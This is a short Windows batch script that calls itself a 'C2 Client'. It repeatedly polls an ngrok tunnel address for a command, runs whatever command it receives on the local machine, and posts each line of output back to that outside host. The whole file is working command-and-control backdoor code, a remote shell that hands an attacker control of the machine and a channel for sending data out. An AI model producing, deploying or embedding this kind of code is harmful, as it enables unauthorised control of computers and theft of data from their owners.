@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

echo [*] Starting C2 Client
echo [*] Connected to: %URL%

:loop
    ping -n 2 127.0.0.1 >nul
    
    rem Get command from ngrok URL
    curl -s %URL% > cmd.txt 2>nul
    set /p CMD=<cmd.txt
    
    if "%CMD%"=="" goto loop
    
    echo [*] Executing: %CMD%
    
    rem Execute and capture output
    for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
        echo %%O > output.txt
        curl -X POST --data-binary @output.txt %URL% 2>nul
        echo [*] Result sent
    )
    
    goto loop
